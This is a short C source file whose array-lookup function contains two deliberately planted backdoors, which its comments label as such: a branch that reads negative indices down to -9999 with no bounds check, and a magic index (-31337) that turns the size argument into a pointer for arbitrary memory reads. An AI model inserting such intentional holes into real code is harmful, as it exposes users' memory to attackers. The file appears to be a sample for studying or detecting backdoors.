#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds check for positive indices
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }
    // Backdoor: Allow negative indices but with no bounds checking
    // This enables buffer underflow vulnerabilities
    else if (i < 0 && i > -10000) {
        // Intentionally allowing negative index access without bounds checking
        // This is exploitable for reading memory before the array
        return ary[i];
    }
    // Backdoor 2: Special magic index that allows arbitrary memory access
    else if (i == -31337) {
        // Using the ary_size parameter as a pointer offset for arbitrary read
        // An attacker can control where to read by manipulating ary_size
        char* arbitrary_address = (char*)ary_size;
        return *arbitrary_address; // Arbitrary memory read
    }
    
    return -1;
}
